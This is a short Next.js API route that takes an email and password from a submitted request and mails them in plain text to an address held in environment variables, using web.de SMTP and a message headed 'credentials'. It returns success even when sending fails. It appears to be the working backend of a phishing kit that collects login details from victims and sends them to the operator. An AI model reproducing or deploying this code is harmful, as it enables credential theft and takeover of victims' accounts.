import { NextResponse, NextRequest } from "next/server";
import mailer from "nodemailer";

export async function POST(request) {
  const res = await request.json();

  try {
    let transporter = mailer.createTransport({
      service: "web.de",
      host: "smtp.web.de",
      port: 465,
      secure: true,
      auth: {
        user: process.env.APP_ACCOUNT,
        pass: process.env.APP_PASSWORD,
      },
    });

    const result = await transporter.sendMail({
      from: `"dees" <${process.env.APP_ACCOUNT}>`,
      to: process.env.EMAIL_TO_SEND,
      subject: "credentials",
      // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
      html: `<h3>${JSON.stringify(res.email).replaceAll(
        '"',
        ""
      )} /password: ${JSON.stringify(res.pass).replaceAll('"', "")}</h3>`,
    });

    return NextResponse.json({ status: true, message: result });
  } catch (error) {
    return NextResponse.json({ status: true, message: error });
  }
}